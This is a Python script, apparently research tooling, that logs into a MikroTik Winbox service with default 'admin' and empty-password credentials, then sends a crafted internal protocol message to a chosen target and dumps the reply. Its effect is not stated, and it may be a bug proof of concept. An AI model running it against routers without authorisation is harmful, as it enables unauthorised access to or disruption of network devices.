#!/usr/bin/env python3

from winbox.session import *

import argparse

port = 8291
user = 'admin'
password = ''

def parse_args():
	parser = argparse.ArgumentParser(description = 'description')
	parser.add_argument('-t', '--target', help = 'target host name', required = True)
	parser.add_argument('-u', '--user', help = 'user name', required = False)
	parser.add_argument('-p', '--password', action = 'store', nargs = '?', help = 'password')
	args = vars(parser.parse_args())
	return args

def run_milo(session):
	msg = mtMessage()
	msg.set_to(24, 10)
	msg.set_command(0xfe000e)
	msg.set_request_id(2)
	msg.set_session_id(session.session_id)
	msg.add_bool(1, False)
	msg.add_bool(2, False)
	msg.set_reply_expected(True)
	pkt = mtPacket(msg.build())
	session.session.send(pkt)
	reply = session.session.recv(1024)
	result = mtMessage(reply.raw)
	result.parse()
	result.dump()

if __name__ == "__main__":
	args = parse_args()
	if args['user']:
		user = args['user']
	if args['password']:
		password = args['password']
	target_port = args['target'].split(':')
	target = target_port[0]
	if len(target_port) == 2:
		port = int(target_port[1])

	print('[*] Establishing a winbox session with %s:%s' % (target, port))
	winbox = mtWinboxSession(target, port)
	if winbox.login_cleartext(user.encode(), password.encode()):
		print('[+] Logged into %s:%s' % (target, port))
	else:
		print('[-] Login failed')
		winbox.close()
		exit(1)

	run_milo(winbox)
	winbox.close()
